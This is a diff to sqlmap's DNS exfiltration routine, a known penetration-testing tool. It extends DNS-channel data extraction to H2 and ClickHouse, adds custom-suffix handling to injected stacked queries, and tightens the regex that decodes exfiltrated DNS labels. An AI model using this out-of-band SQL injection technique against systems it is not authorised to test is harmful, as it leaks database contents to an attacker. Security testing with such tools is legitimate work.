@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -46,7 +46,7 @@ def dnsUse(payload, expression):
     count = 0
     offset = 1
 
-    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
+    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL, DBMS.H2, DBMS.CLICKHOUSE):
         output = hashDBRetrieve(expression, checkConf=True)
 
         if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
@@ -74,7 +74,10 @@ def dnsUse(payload, expression):
 
                 if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                     query = agent.prefixQuery("; %s" % expressionUnescaped)
-                    query = "%s%s" % (query, queries[Backend.getIdentifiedDbms()].comment.query)
+                    if conf.suffix is not None:
+                        query = agent.suffixQuery(query, comment="", suffix=conf.suffix)
+                    else:
+                        query = "%s%s" % (query, queries[Backend.getIdentifiedDbms()].comment.query)
                     forgedPayload = agent.payload(newValue=query)
                 else:
                     forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
@@ -84,7 +87,10 @@ def dnsUse(payload, expression):
                 _ = conf.dnsServer.pop(prefix, suffix)
 
                 if _:
-                    _ = extractRegexResult(r"%s\.(?P<result>.+)\.%s" % (prefix, suffix), _, re.I)
+                    # Note: non-greedy so a '--dns-domain' label that happens to match the random
+                    # suffix can't make the match run past the real boundary (the boundary alphabet
+                    # excludes hex characters, so it can never under-match into the hex payload)
+                    _ = extractRegexResult(r"%s\.(?P<result>.+?)\.%s" % (re.escape(prefix), re.escape(suffix)), _, re.I)
                     _ = decodeDbmsHexValue(_)
                     output = (output or "") + _
                     offset += len(_)
